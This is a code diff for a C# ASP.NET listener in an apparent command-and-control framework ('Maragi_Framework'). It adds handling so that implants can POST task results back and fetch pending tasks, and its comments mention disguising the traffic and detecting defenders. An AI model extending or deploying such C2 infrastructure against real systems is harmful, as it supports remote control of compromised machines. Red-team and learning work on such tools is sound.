@@ -4,7 +4,10 @@ using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
 using System;
 using System.Text;
-using Newtonsoft.Json; // Use nuget pkgm to download this 
+using Newtonsoft.Json;
+using System.IO;
+using System.Threading.Tasks;
+using System.Collections.Generic; // Use nuget pkgm to download this 
 
 
 namespace Maragi_Framework.Models.Listeners
@@ -20,7 +23,7 @@ namespace Maragi_Framework.Models.Listeners
             _agents = agents;
         }
 
-        public IActionResult HandleImplant()
+        public async Task<IActionResult> HandleImplant()
         {
             var metadata = ExtractMetadata(HttpContext.Request.Headers);
             if (metadata is null) return NotFound();
@@ -35,15 +38,29 @@ namespace Maragi_Framework.Models.Listeners
 
             agent.CheckIn();
 
+            if (HttpContext.Request.Method == "POST")
+            {
+                string json;
+
+                using (var sr = new StreamReader(HttpContext.Request.Body))
+                {
+                    json = await sr.ReadToEndAsync();
+                }
+
+                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
+                agent.AddTaskResults(results);
+            }
+
             var tasks = agent.GetPendingtask();
 
             // automatically gets serialize as JSON
             // might want to futher develop to disguse this in a http request
             return Ok(tasks);
+            
         }
-
         // How do TeamServer know what it is interaccting with (defender , web scapper , external tools)
-        private AgentMetadata ExtractMetadata(IHeaderDictionary headers) {
+        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
+        {
 
             // if no header call Authorization , return null
             if (!headers.TryGetValue("Authorization", out var encodedMetadata))
